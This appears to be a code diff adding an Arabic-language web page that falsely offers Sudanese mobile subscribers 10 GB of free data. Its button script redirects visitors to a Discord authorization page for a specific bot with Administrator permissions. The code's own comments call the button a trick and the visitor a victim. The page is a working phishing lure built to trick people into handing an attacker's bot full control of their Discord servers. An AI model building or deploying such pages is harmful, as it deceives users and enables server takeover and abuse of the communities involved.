@@ -1,1 +1,80 @@
 
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>عروض الإنترنت المجانية في السودان</title>
+    <style>
+        body {
+            background-color: #0f1115;
+            color: #ffffff;
+            font-family: Tahoma, sans-serif;
+            text-align: center;
+            padding: 50px 20px;
+        }
+        .container {
+            background: #181b22;
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+        }
+        h2 {
+            color: #00ffcc;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #b9bbbe;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+        .claim-btn {
+            background: linear-gradient(45deg, #ff007f, #7f00ff);
+            color: white;
+            border: none;
+            padding: 15px 20px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            transition: 0.3s;
+        }
+        .claim-btn:hover {
+            opacity: 0.9;
+            transform: scale(1.02);
+        }
+        .networks {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #72767d;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>🎁 احصل على 10 جيجابايت مجاناً!</h2>
+        <p>عرض لفترة محدودة لجميع عملاء شبكات الاتصالات في السودان. اضغط بالأسفل لتفعيل الهدية فوراً على خطك.</p>
+        
+        <!-- زر الخدعة الموجه لرابط البوت -->
+        <button class="claim-btn" onclick="claimGift()">استلام 10 جيجا مجانية 🌐</button>
+        
+        <div class="networks">متوافق مع: سوداني (Sudani) • زين (Zain) • إم تي إن (MTN)</div>
+    </div>
+
+    <script>
+        function claimGift() {
+            // رابط البوت الخاص بك مع الصلاحيات المطلوبة
+            const clientId = "1572338745490022502";
+            const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${clientId}&permissions=8&integration_type=0&scope=bot`;
+            
+            // توجيه الضحية مباشرة لصفحة موافقة ديسكورد
+            window.location.href = oauthUrl;
+        }
+    </script>
+
+</body>
+</html>
